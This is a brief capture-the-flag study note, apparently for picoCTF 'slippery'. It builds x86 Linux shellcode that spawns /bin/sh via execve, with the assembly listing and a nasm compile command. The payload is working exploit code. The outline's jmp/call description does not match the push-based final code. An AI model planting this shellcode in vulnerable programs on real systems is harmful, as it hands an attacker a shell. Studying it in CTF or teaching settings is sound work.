# /bin/sh shellcode
Based on picoCTF slippery

## Building the shellcode:
```c
execve("/bin/sh", {NULL}, {NULL});
```

## Building the arguments:
jmp to the bottom of the stack
call the top of the stack
place "/bin//sh" below the call to become %ebx

## Building the syscall:
`sys_execve` is number 11
called with 0x80

## Full shellcode:
```as
xor   eax, eax ; zeroes eax
push  eax
push  '//sh'
push  '/bin'
mov   ebx, esp ; move ptr to '/bin//sh' into ebx
mov   ecx, eax ; move zero to arg
mov   edx, eax ; move zero to arg
push byte 11
pop   eax
int   0x80
```

# Compile:
```s
nasm -f bin -l sh.lst sh.asm
```

